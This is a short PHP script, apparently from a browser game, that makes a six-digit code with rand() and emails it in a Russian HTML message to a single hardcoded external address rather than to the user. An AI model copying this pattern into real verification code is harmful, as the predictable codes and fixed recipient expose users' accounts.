<?php
require_once('system/func.php');
require_once('system/header.php');
require_once('robo1.php');
$date = date("h:i");
$time = date("d.m.20y");
$pas = rand(111111,999999);
header('Content-Type: text/html; charset=utf-8');
$headers= "<header>MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n</header>";
$htmlpismo = "<div style='background-color:#C8AC70;'>Здравствуйте,".$user['name']."<br><b> Ваш код:</b> ".$pas."</br><br><b> Дата: </b>".$time."</br><br><b> Время:</b> ".$date."</br><br><b> Сервер: mobitva2.0 \n по всем вопросам писать на support@mobitva2.online<b><br><center>
<img src='https://mobitva2.online/images/logo2.png'></div></br>";
mail("shokk-klass@inbox.ru", "Mobitva 2", $htmlpismo,$headers);
